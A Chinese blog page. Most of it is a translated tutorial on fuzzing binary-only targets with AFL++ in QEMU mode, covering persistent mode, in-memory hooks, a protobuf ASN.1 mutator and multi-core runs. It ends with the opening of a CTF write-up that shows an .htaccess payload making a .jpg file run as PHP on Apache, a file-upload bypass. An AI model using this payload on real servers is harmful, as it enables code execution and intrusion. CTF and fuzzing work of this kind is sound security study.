<h3 id="对性能的影响"><a href="#对性能的影响" class="headerlink" title="对性能的影响"></a>对性能的影响</h3><p>运行 Fuzzer 让我们看到调整 <code>AFL_ENTRYPOINT</code> 的优势：</p>
<ul>
<li><p>使用默认设置 <code>AFL_ENTRYPOINT</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec speed : 18.24/sec (zzzz...)</span><br></pre></td></tr></table></figure></li>
<li><p>调整 <code>AFL_ENTRYPOINT</code> 后（为了跳过 <code>init</code> 相位）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec speed : 1038/sec</span><br></pre></td></tr></table></figure></li>
</ul>
<p>这说明<strong>的 <code>AFL_ENTRYPOINT</code> 选择对于模糊器可以执行的每秒测试数量的最大化至关重要</strong>。</p>
<p>在下一节中，我们将看到性能仍然可以通过利用另一个 AFL++ 特性来进一步提高：持续模式。</p>
<h2 id="持续"><a href="#持续" class="headerlink" title="持续"></a>持续</h2><h3 id="持续模式（step3）"><a href="#持续模式（step3）" class="headerlink" title="持续模式（step3）"></a>持续模式（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step3">step3</a>）</h3><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>“持续模式”是允许 AFL++ 避免每个迭代都调用 <code>fork</code> 的特性。相反，它在到达某个地址（<code>AFL_QEMU_PERSISTENT_ADDR</code>）时保存子节点的状态，并在到达另一个地址（ <code>AFL_QEMU_PERSISTENT_RET</code>）时恢复此状态。</p>
<p><strong>注意：</strong> 除了 <code>AFL_QEMU_PERSISTENT_RET</code>， <code>AFL_QEMU_PERSISTENT_RETADDR_OFFSET</code> 也可以使用。如果没有设置这些值，AFL++ 将在到达第一个 <code>ret</code> 指令时停止（仅当 <code>AFL_QEMU_PERSISTENT_ADDR</code> 指向函数的开始时，否则你将<em>必须</em>手动设置该值）。</p>
<p>“恢复”状态可以指“恢复寄存器”（ <code>AFL_QEMU_PERSISTENT_GPR</code>）和&#x2F;或“恢复内存”（ <code>AFL_QEMU_PERSISTENT_MEM</code>）。由于恢复内存状态的开销很高，因此只应在必要时进行。在进行模糊处理时，请注意稳定性，以查看是否有必要启用此功能。</p>
<p>即使在使用持续模式时，AFL++ 仍将不时调用 <code>fork</code>（每<code>AFL_QEMU_PERSISTENT_CNT</code> 次迭代，或默认情况下为 1000 次）。如果稳定性足够高，增加此值可能会提高性能（最大值为 10000）。</p>
<h4 id="应用于我们的示例"><a href="#应用于我们的示例" class="headerlink" title="应用于我们的示例"></a>应用于我们的示例</h4><p>在我们的例子中，我们可以通过设置 <code>AFL_QEMU_PERSISTENT_ADDR</code> 与 <code>AFL_ENTRYPOINT</code>（ <code>parse_cert</code> 函数的地址）相同的值来开始。这样，AFL++ 将把我们的进程恢复到它读取输入文件内容之前的状态。</p>
<p>以下是相关章节 <code>afl_config.sh</code>：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> fuzz_func_addr fuzz_func_size &lt; &lt;(find_func <span class="string">&quot;parse_cert&quot;</span>)</span><br><span class="line"><span class="built_in">export</span> AFL_QEMU_PERSISTENT_ADDR=$(hex_encode $((&quot;<span class="variable">$QEMU_BASE_ADDRESS</span>&quot; + &quot;<span class="variable">$fuzz_func_addr</span>&quot;)))</span><br><span class="line"><span class="built_in">export</span> AFL_QEMU_PERSISTENT_GPR=1</span><br><span class="line"><span class="built_in">export</span> AFL_QEMU_PERSISTENT_CNT=10000</span><br></pre></td></tr></table></figure>

<p>在我们的示例中，稳定性保持在 100%，而不必恢复内存状态，因此我们只设置 <code>AFL_QEMU_PERSISTENT_GPR</code>。我们也增加 <code>AFL_QEMU_PERSISTENT_CNT</code> 到它的最大值，因为这不会对我们的稳定性产生负面影响。</p>
<p>中<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step3">step3 文件夹</a>提供的文件直接对此进行测试。你还可以自己确认，AFL++ 文档中描述的性能提升确实存在：根据我们的测试，我们每秒的迭代次数增加了 10 倍以上！</p>
<h3 id="内存中模糊处理（step4）"><a href="#内存中模糊处理（step4）" class="headerlink" title="内存中模糊处理（step4）"></a>内存中模糊处理（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step4">step4</a>）</h3><p>尽管使用了持续模式，但在到达测试函数之前，我们的目标仍会执行一些不必要的操作，特别是打开和读取由 fuzzer 生成的文件的内容。相反，我们可以使用“内存中模糊处理”来跳过这一步，直接从模糊器的内存中读取输入。</p>
<h4 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h4><p>要做到这一点，我们必须实施“挂钩”。它实际上非常简单，其源代码提供在<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src/hook/hook.c">这个文件</a>：</p>
<ul>
<li>我们定义了一个 <code>afl_persistent_hook_init</code> 函数，它声明我们是否要使用内存中的模糊处理。</li>
<li>更有趣的是，我们定义了一个 <code>afl_persistent_hook</code> 函数，它可以在每次迭代时覆盖寄存器值和内存，就在 <code>AFL_QEMU_PERSISTENT_ADDR</code> 到达地址之前。我们所要做的就是覆盖包含要解析的缓冲区的内存，并在正确的寄存器中设置其长度。</li>
</ul>
<p><strong>注意：</strong> 你可以通过在目标函数的开头运行 <code>gdb</code> 和中断，或者直接通过查看反汇编代码来确定要使用哪些寄存器。</p>
<p>这个钩子应该被编译为一个共享库，AFL++ 将在运行时加载。</p>
<h4 id="环境变量-1"><a href="#环境变量-1" class="headerlink" title="环境变量"></a>环境变量</h4><p>要指示 AFL++ 使用我们的钩子，我们只需设置 <code>AFL_QEMU_PERSISTENT_HOOK</code> 文件的 <code>.so</code> 路径：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AFL_QEMU_PERSISTENT_HOOK=<span class="string">&quot;<span class="variable">$BASEPATH</span>/src/hook/libhook.so&quot;</span></span><br></pre></td></tr></table></figure>

<p>正如所讨论的，我们希望更改 <code>AFL_QEMU_PERSISTENT_ADDR</code> 为在迭代期间跳过对 <code>read_file</code> 的调用。这里有两个选项：</p>
<ul>
<li><p>要么我们把它设置在 <code>base64_decode</code> 起始地址。在这种情况下，我们也将模糊化 <code>base64_decode</code> 函数。</p>
</li>
<li><p>或者我们把它设置在 <code>parse_cert_buf</code>。在这种情况下 <code>base64_decode</code>，将不会模糊化。</p>
<p>因为 <code>base64_decode</code> 是由一个受信任的外部库实现的，我们不想测试它（在本例中是 OpenSSL），所以我们将选择第二个选项。</p>
</li>
</ul>
<p>因此，我们可以将 <code>AFL_QEMU_PERSISTENT_ADDR</code> 移动到以下地址 <code>parse_cert_buf</code>：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> fuzz_func_addr fuzz_func_size &lt; &lt;(find_func <span class="string">&quot;parse_cert_buf&quot;</span>)</span><br><span class="line"><span class="built_in">export</span> AFL_QEMU_PERSISTENT_ADDR=$(hex_encode $((&quot;<span class="variable">$QEMU_BASE_ADDRESS</span>&quot; + &quot;<span class="variable">$fuzz_func_addr</span>&quot;)))</span><br></pre></td></tr></table></figure>

<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>移动 <code>AFL_QEMU_PERSISTENT_ADDR</code> 对我们的语料库有影响。实际上，由 fuzzer 生成的缓冲区现在直接在中 <code>parse_cert_buf</code> 使用（从未传递给 <code>base64_decode</code>）。这意味着我们必须重建我们的语料库。在我们的例子中，这非常简单：我们只需要从以前的语料库中解码 Base64 文件，并将它们保存为原始二进制文件。</p>
<h4 id="应用于我们的示例-1"><a href="#应用于我们的示例-1" class="headerlink" title="应用于我们的示例"></a>应用于我们的示例</h4><p>这种方法的一个奇怪之处在于，因为我们不再从文件中读取数据，所以 fuzzer 不再需要在磁盘上创建一个文件。但是，请记住，我们的目标程序期望从其中读取，否则它将立即退出。由于该文件的内容不再相关（因为 <code>read_file</code> 不再调用），我们可以在调用程序之前手动创建一个空的占位符。</p>
<p>你可以在中<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step4">step4 文件夹</a>找到此新设置。</p>
<h3 id="对性能的影响-1"><a href="#对性能的影响-1" class="headerlink" title="对性能的影响"></a>对性能的影响</h3><p>总的来说，在我们的测试中，启用持续模式可以将性能提高 10 倍（但在实际场景中不要总是期望有这样的提升！），而内存中的钩子可以产生额外的双重改进：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec speed : 25.6k/sec</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 由于执行速度并不是唯一重要的指标，你当然应该关注其他指标，如稳定性、新发现的路径、覆盖率等。</p>
<h2 id="语法感知器（step5）"><a href="#语法感知器（step5）" class="headerlink" title="语法感知器（step5）"></a>语法感知器（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step5">step5</a>）</h2><h3 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h3><p>回顾一下我们迄今所取得的成就：</p>
<ul>
<li>我们将 AFL++ 设置为使用 QEMU 来模糊仅二进制目标。</li>
<li>我们将工具配置为仅覆盖相关地址；</li>
<li>我们调整了 AFL++ 入口点，并启用了持续模式以减少初始化时间。</li>
</ul>
<p>在许多情况下，这样的配置（当与我们稍后将简要介绍的多处理相结合时）足以运行成功的活动。但是，在本例中，我们决定模糊处理高度结构化数据格式的目标。在这种情况下，引入改变输入数据的新方法可能是有趣的。</p>
<p>事实上，AFL++ 的另一个可调方面是生成和突变逻辑。AFL++ 内置了对一组简单（但非常有效）的突变的支持：</p>
<ul>
<li>随机比特翻转</li>
<li>随机字节翻转</li>
<li>运算</li>
<li>等等</li>
</ul>
<p>在大多数情况下，这些突变足以探索模糊的代码。某些数据格式具有内部约束，这些约束将导致样本因不满足这些约束而被过早拒绝。例如，我们的示例中使用的格式 ASN.1 就是这种情况：在不考虑这些约束的情况下生成突变可能会导致大多数样本被目标立即视为无效而丢弃，而不会实现任何额外的覆盖。这意味着 Fuzzing Campaign <strong>汇聚前需要时间</strong>生成相关案例。</p>
<p>为了解决这种情况，AFL++ 允许用户提供他们自己的自定义变异体，以引导 Fuzzer 生成更适合的输入。如<a target="_blank" rel="noopener" href="https://aflplus.plus/docs/custom_mutators">官方文档</a>中所述，<strong>AFL++可插入自定义 Mutator</strong> ，只要此Mutator实现了所需的 API 函数。</p>
<h3 id="实施"><a href="#实施" class="headerlink" title="实施"></a>实施</h3><p>有几个选项可以在 AFL++ 中实现语法感知的转变器，其中之一是<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/Grammar-Mutator">AFL++ 项目的语法变异器部分</a>。然而，由于它不提供对 ASN.1 的支持，我们转而依赖于<a target="_blank" rel="noopener" href="https://github.com/google/libprotobuf-mutator">libprotobuf</a>来<a target="_blank" rel="noopener" href="https://github.com/google/fuzzing/tree/master/proto/asn1-pdu">处理 ASN.1</a>。</p>
<p>我们从<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/custom_mutators.md">官方文档</a>中获得了灵感，并在 AFL++<a target="_blank" rel="noopener" href="https://github.com/P1umer/AFLplusplus-protobuf-mutator">现有骨架</a> 和我们的自定义 Mutator 之间建立了“粘合剂”。</p>
<p>结果存在于中<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src/mutator/custom_mutator.cpp">custom_mutator.cpp</a>，并实现来自 AFL++API 的以下函数：</p>
<ul>
<li><code>afl_custom_init</code>: 初始化我们自定义的 mutator</li>
<li><code>afl_custom_fuzz</code>: 用protobuf mutator 对输入进行变异</li>
<li><code>afl_custom_post_process</code> 对变异数据执行后处理，以确保我们的目标接收到正确格式化的输入</li>
<li><code>afl_custom_deinit</code> 清理所有东西</li>
</ul>
<h3 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式"></a>输入格式</h3><p>实际上，该 <code>afl_custom_post_process</code> 函数起着重要的作用：我们的自定义 mutator 基于 libprotobuf，因此需要 protobuf 数据作为输入。然而，我们的目标只能解析 ASN.1 数据，因此我们需要将数据从 Protobuf 转换为 ASN.1. 幸运的是，protobuf mutator 已经在中 <code>x509_certificate::X509CertificateToDER</code> 实现了此功能。</p>
<p>整个过程概述如下：</p>
<p><img src="https://airbus-seclab.github.io/AFLplusplus-blogpost/img/afl++-protobuf-asn1.svg" alt="PROTOBUF 到 ASN1"></p>
<p>和以前一样，我们需要调整语料库中文件的格式，以与我们的 Fuzzing 工具保持一致。这一次，我们需要将 ASN.1 DER 文件转换为 Protobuf.为此，我们实现了一个自定义脚本（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src/mutator/asn1_to_protobuf.py"><em>protobuf.py 的 ASN1</em></a>），该脚本在此步骤<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step4/build_corpus.sh">build_corpus.sh</a>中运行一次。</p>
<h4 id="环境变量-2"><a href="#环境变量-2" class="headerlink" title="环境变量"></a>环境变量</h4><p>有了这个，剩下的就是指示 AFL++ 使用我们的自定义 Mutator.为此，我们只需设置 <code>AFL_CUSTOM_MUTATOR_LIBRARY</code> 文件的 <code>.so</code> 路径：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AFL_CUSTOM_MUTATOR_LIBRARY=<span class="string">&quot;<span class="variable">$BASEPATH</span>/libmutator.so&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们还禁用 AFL++ 执行的所有默认突变和修剪：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AFL_DISABLE_TRIM=1</span><br><span class="line"><span class="built_in">export</span> AFL_CUSTOM_MUTATOR_ONLY=1</span><br></pre></td></tr></table></figure>

<h4 id="应用于我们的示例-2"><a href="#应用于我们的示例-2" class="headerlink" title="应用于我们的示例"></a>应用于我们的示例</h4><p>你可以在<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step5">step5 文件夹</a>中找到此新设置。</p>
<h3 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h3><p>这一次，它不是为了提高性能，而是为了达到更深的路径。在我们的例子中，这是一个非常小的目标，很难衡量这种影响。但是，这通常是通过比较覆盖率并检查是否使用自定义赋值函数到达新分支来完成的。</p>
<p>但是，你不需要在使用自定义 Mutator 和使用默认的 AFL++ 突变之间进行选择：你可以通过运行 Fuzzer 的多个实例来实现两全其美，我们将在下一步中讨论这一点。</p>
<h2 id="多处理（step6）"><a href="#多处理（step6）" class="headerlink" title="多处理（step6）"></a>多处理（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step6">step6</a>）</h2><p>这一步是我们把所有的东西放在一起来运行我们实际的模糊运动。事实上，在真正的活动中，你不会限制自己只在一个核心&#x2F;线程&#x2F;机器上进行模糊测试。幸运的是，AFL++ 处理并行运行多个实例。</p>
<p>但是，如<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#c-using-multiple-cores">文档</a>中所述，一次运行太多实例并不总是有用的：</p>
<blockquote>
<p>在同一台机器上 由于 AFL++ 的设计，有一个有用的 CPU 核心&#x2F;线程的最大数量，使用更多和整体性能反而会下降。此值取决于目标和限制在每台机器 32 到 64 个核心之间</p>
</blockquote>
<p>需要注意的是，即使在达到该限制之前，性能的提高也不是成比例的（内核数量加倍并不会使每秒执行次数加倍）：同步进程需要额外的开销。</p>
<h3 id="不同的配置、变量、时间表"><a href="#不同的配置、变量、时间表" class="headerlink" title="不同的配置、变量、时间表"></a>不同的配置、变量、时间表</h3><p>当运行 Fuzzer 的多个实例时，可以通过并行使用各种策略和配置来优化覆盖率。因为我们的目的不是反映官方的 AFL++ 文档，我们将参考你的文档，<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#c-using-multiple-cores">这一节</a>该文档描述了如何在 Fuzzing 时使用多个内核。</p>
<p>然而，由于该页面主要针对源代码可用的 Fuzzing 目标，因此需要对某些方面进行调整，以便只进行二进制 Fuzzing.</p>
<h3 id="仅限二进制的特性"><a href="#仅限二进制的特性" class="headerlink" title="仅限二进制的特性"></a>仅限二进制的特性</h3><p>当对源代码可用的目标进行模糊处理时，许多功能（例如 ASAN、UBSAN、CFISAN、COMPCOV）需要使用特定选项重新编译目标。尽管在处理二进制目标时不能选择重新编译，但其中一些特性在 QEMU 中仍然可用（如文档所述<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_binary-only_targets.md#qemu-mode">here</a>）。</p>
<p>例如， <code>AFL_USE_QASAN</code> 允许使用 <code>LD_PRELOAD</code> 自动注入库来使用<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/libqasan/README.md">使用 QEMU 的 ASAN</a>。类似地， <code>AFL_COMPCOV_LEVEL</code> 允许使用<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/libcompcov/README.md">带有 QEMU 的 CompCov</a>，而无需重新编译目标。</p>
<h3 id="多设备设置"><a href="#多设备设置" class="headerlink" title="多设备设置"></a>多设备设置</h3><p>对于较大的 Fuzzing 活动，你可以使用多个主机，每个主机运行多个 Fuzzer 进程。此设置实际上相当简单，并且在中<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#d-using-multiple-machines-for-fuzzing">官方文档</a>有详细介绍。为了简单和可重复性，我们没有在这篇文章中使用多台机器。</p>
<h3 id="应用于我们的示例-3"><a href="#应用于我们的示例-3" class="headerlink" title="应用于我们的示例"></a>应用于我们的示例</h3><p>从这篇博文开始，输入格式和目标函数就发生了变化。你可以在下表中找到这些更改的摘要：</p>
<table>
<thead>
<tr>
<th>Configuration</th>
<th>Targeted function</th>
<th>预期的输入格式</th>
</tr>
</thead>
<tbody><tr>
<td>Default entrypoint</td>
<td><code>main()</code></td>
<td><code>base64(ASN.1)</code></td>
</tr>
<tr>
<td>Custom entrypoint</td>
<td><code>main()</code></td>
<td><code>base64(ASN.1)</code></td>
</tr>
<tr>
<td>In-memory fuzzing</td>
<td><code>parse_cert_buf()</code></td>
<td><code>ASN.1/ DER</code></td>
</tr>
<tr>
<td>Custom mutator</td>
<td><code>parse_cert_buf()</code></td>
<td><code>protobuf</code> -&gt; <code>ASN.1</code></td>
</tr>
</tbody></table>
<p>在这一步中，我们运行了一个带有自定义赋值函数的实例，以及几个没有该赋值函数的实例。因此，我们需要 ASN.1（ <code>corpus_unique</code>）中的一个语料库和 protobuf（ <code>corpus_protobuf_unique</code>）中的一个语料库，以及单独的输出目录。</p>
<p>中<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step6">step6 文件夹</a>提供了这种多语料库设置的示例。请注意，与其他步骤相反，最有趣的更改是在 <code>fuzz.sh</code> 文件中，而不是在中 <code>afl_config.sh</code>。</p>
<h2 id="评估活动"><a href="#评估活动" class="headerlink" title="评估活动"></a>评估活动</h2><p>在开始一项活动后，你可能需要对其进行监控，评估其效率，并调查其结果。这超出了这篇文章的范围，并<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md">正式文件</a>给出了各种细节，我们不打算在这里重复。然而，为了给你一个概念，我们将快速浏览其中的一些问题。</p>
<h3 id="监视活动"><a href="#监视活动" class="headerlink" title="监视活动"></a>监视活动</h3><p>AFL++ 提供以下工具来监控运行实例的状态：</p>
<ul>
<li><code>afl-whatsup</code>，显示在后台运行的 Fuzzer 实例的状态：</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ afl-whatsup -s output</span><br><span class="line">Summary stats</span><br><span class="line">=============</span><br><span class="line">       Fuzzers alive : 4</span><br><span class="line">      Total run time : 4 minutes, 0 seconds</span><br><span class="line">         Total execs : 1 millions, 849 thousands</span><br><span class="line">    Cumulative speed : 30829 execs/sec</span><br><span class="line">       Average speed : 7707 execs/sec</span><br><span class="line">       Pending items : 0 faves, 0 total</span><br><span class="line">  Pending per fuzzer : 0 faves, 0 total (on average)</span><br><span class="line">       Crashes saved : 3</span><br><span class="line">Cycles without finds : 204/26/1066/264</span><br><span class="line">  Time without finds : 1 minutes, 26 seconds</span><br></pre></td></tr></table></figure>
<ul>
<li><code>afl-plot</code>，它可以绘制特定实例的指标随时间的演变：</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-plot output/afl-main /tmp/plot</span><br></pre></td></tr></table></figure>

<p>  <img src="https://airbus-seclab.github.io/AFLplusplus-blogpost/img/afl-plot.png" alt="AFL-PLOT 输出示例"></p>
<h3 id="测量覆盖率"><a href="#测量覆盖率" class="headerlink" title="测量覆盖率"></a>测量覆盖率</h3><p>检查覆盖范围是另一回事，对于只有二进制的目标有各种特殊性。这超出了这篇文章的范围，但你可以找到有趣的资源<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#g-checking-the-coverage-of-the-fuzzing">在官方文件中</a>。</p>
<p>OUR<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step6">Step6 文件夹</a>上下文中的典型命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-showmap -Q -C -i <span class="string">&quot;<span class="variable">$output_path</span>&quot;</span>/afl-main/queue -o afl-main.cov -- <span class="string">&quot;<span class="variable">$target_path</span>&quot;</span> /tmp/.afl_fake_input</span><br></pre></td></tr></table></figure>

<h3 id="检查崩溃和超时"><a href="#检查崩溃和超时" class="headerlink" title="检查崩溃和超时"></a>检查崩溃和超时</h3><p>一旦 AFL++ 识别出崩溃或挂起，它将把触发它的输入保存在输出目录中的专用文件夹中，以便你可以重现它。</p>
<p>理解这些结果的有用工具可以是：</p>
<ul>
<li><code>afl-tmin</code> 以获得再现崩溃的最小测试用例</li>
<li><a target="_blank" rel="noopener" href="https://github.com/gaasedelen/lighthouse">Lighthouse</a>探索特定案例的覆盖范围</li>
<li><a target="_blank" rel="noopener" href="https://valgrind.org/">Valgrind</a>调查内存问题</li>
<li>可能还有更多！</li>
</ul>
<p>此外，对于自定义 Mutator 发现的情况，输入将采用 Protobuf 格式，这不容易直接在目标上重放。为此，我们实现了一个简单的程序，它允许将 protobuf 转换回 ASN.1（请参阅<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src/mutator/protobuf_to_der.cpp">protobuf_to_der.CPP</a>）</p>
<h2 id="到目前为止我们所做的"><a href="#到目前为止我们所做的" class="headerlink" title="到目前为止我们所做的"></a>到目前为止我们所做的</h2><p>在这篇文章中，我们的目标是强调我们的方法，解释 AFL++ 的概念，并为 Fuzz 二进制目标提供一个框架。这导致我们根据我们的目标和我们自己的经验做出选择，这在其他情况下可能并不相关。特别地，其他语法变异体可能更容易实现（例如<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/Grammar-Mutator">语法变异器</a>，如果它支持正确的语法）。</p>
<p>然而，通过配置内存中的持续性、调整定制的语法感知突变以及实现多处理，我们实现了以有趣的执行速度和覆盖范围运行 Fuzzing 活动。</p>
<p>显然，这只是故事的开始：运行 Fuzzing 活动本身和分析结果都有自己的一套新问题和乐趣！</p>
<h2 id="参考书目"><a href="#参考书目" class="headerlink" title="参考书目"></a>参考书目</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
<li>AFL++-<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus">https://github.com/AFLplusplus/AFLplusplus</a></li>
<li>QEMU-<a target="_blank" rel="noopener" href="https://gitlab.com/qemu-project/qemu">https://gitlab.com/qemu-project/qemu</a></li>
<li>语法变异器，AFL++ 基于语法的自定义变异器-<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/Grammar-Mutator">https://github.com/AFLplusplus/Grammar-Mutator</a></li>
<li>Nautilus，基于语法的 Fuzzer，支持 AFL-QEMU-<a target="_blank" rel="noopener" href="https://github.com/nautilus-fuzz/nautilus">https://github.com/nautilus-fuzz/nautilus</a></li>
<li>AFL++Protobuf Mutator 骨架-<a target="_blank" rel="noopener" href="https://github.com/P1umer/AFLplusplus-protobuf-mutator">https://github.com/P1umer/AFLplusplus-protobuf-mutator</a></li>
</ul>
<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><ul>
<li>AFL++ 文档-<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md</a></li>
<li>AFL++ 关于二进制 Fuzzing 的文档-<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_binary-only_targets.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_binary-only_targets.md</a></li>
<li>关于 QEMU 内部的一系列帖子-<a target="_blank" rel="noopener" href="https://airbus-seclab.github.io/qemu_blog">https://airbus-seclab.github.io/qemu_blog</a></li>
<li>成功模糊的种子选择-<a target="_blank" rel="noopener" href="https://hexhive.epfl.ch/publications/files/21ISSTA2.pdf">https://hexhive.epfl.ch/publications/files/21ISSTA2.pdf</a></li>
<li>模糊测试：为 AFL<a target="_blank" rel="noopener" href="https://medium.com/fuzzstation/fuzz-testing-choosing-a-seed-file-for-afl-fee4a09753c2">https://medium.com/fuzzstation/fuzz-testing-choosing-a-seed-file-for-afl-fee4a09753c2</a>选择种子文件</li>
<li>应对哪些应用程序进行模糊测试？-<a target="_blank" rel="noopener" href="https://medium.com/fuzzstation/what-applications-should-be-fuzz-tested-e83c77aec84a">https://medium.com/fuzzstation/what-applications-should-be-fuzz-tested-e83c77aec84a</a></li>
<li>准备申请 AFL-Fuzz-<a target="_blank" rel="noopener" href="https://medium.com/fuzzstation/preparing-an-application-for-afl-fuzz-a2a838c949cb">https://medium.com/fuzzstation/preparing-an-application-for-afl-fuzz-a2a838c949cb</a></li>
<li>AFL 变异图工具-<a target="_blank" rel="noopener" href="https://github.com/adrianherrera/afl-mutation-graph">https://github.com/adrianherrera/afl-mutation-graph</a></li>
<li>模糊书：灰盒模糊-<a target="_blank" rel="noopener" href="https://www.fuzzingbook.org/html/GreyboxFuzzer.html">https://www.fuzzingbook.org/html/GreyboxFuzzer.html</a></li>
<li>AFL++：结合模糊研究的增量步骤，对 AFL++ 概念（例如分叉服务器）进行了很好的解释-<a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/woot20-paper-fioraldi.pdf">https://www.usenix.org/system/files/woot20-paper-fioraldi.pdf</a></li>
<li>如何使用 QEMU（和 AFL）进行模糊处理-<a target="_blank" rel="noopener" href="https://galtashma.com/posts/how-fuzzing-with-qemu-and-afl-work">https://galtashma.com/posts/how-fuzzing-with-qemu-and-afl-work</a></li>
</ul>

	
	</div>
  <a type="button" href="/2023/07/20/AFL-QEMU/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/07/17/SWPUCTF2022-easyupload3-wp/" >SWPUCTF2022-easyupload3-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-07-17
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2025">题目链接</a></p>
<ul>
<li>apache服务器，标题提示“试试和某些文件配合呢”，尝试上传<code>.htacess</code> 文件，内容：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt; </span><br><span class="line">       SetHandler  application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<blockquote>
<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
</blockquote>
